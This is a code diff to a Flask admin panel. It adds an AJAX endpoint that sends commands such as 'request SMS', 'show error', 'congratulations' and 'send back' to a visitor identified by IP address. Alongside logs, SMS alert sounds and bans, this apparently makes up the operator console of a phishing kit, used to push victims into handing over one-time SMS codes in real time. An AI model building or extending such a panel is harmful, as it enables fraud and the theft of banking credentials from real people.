@@ -5,7 +5,7 @@ from functools import wraps
 from typing import Any, Callable, Optional
 
 import requests
-from flask import Blueprint, flash, redirect, render_template, request, session, url_for
+from flask import Blueprint, flash, redirect, render_template, request, session, url_for, jsonify
 
 from ..config import ADMIN_STATIC_DIR, CloudflareConfig
 from ..database import get_cursor
@@ -275,6 +275,40 @@ def logs():
         sms_sound=play_sms_sound,
         current_ts=current_ts,
     )
+
+
+@admin_bp.route("/logs-ajax", methods=["POST"])
+@_login_required
+def logs_ajax():
+    """AJAX endpoint for instant command execution without page reload"""
+    action = request.form.get("action")
+    target_ip = request.form.get("target_ip")
+    log_id = request.form.get("log_id")
+    log_id_int = int(log_id) if log_id and log_id.isdigit() else None
+    
+    # Handle command
+    if action in COMMAND_TABLES:
+        if _handle_command(action, target_ip or ""):
+            command_names = {
+                "sms": "SMS İste",
+                "tebrik": "Tebrik",
+                "hata1": "Hata Göster",
+                "back": "Geri Gönder"
+            }
+            return jsonify({
+                "status": "success",
+                "message": f"✓ {command_names.get(action, 'Komut')} gönderildi"
+            })
+        else:
+            return jsonify({
+                "status": "error",
+                "message": "✗ Komut gönderilemedi"
+            })
+    
+    return jsonify({
+        "status": "error",
+        "message": "✗ Geçersiz işlem"
+    })
 
 
 @admin_bp.route("/bans", methods=["GET", "POST"])
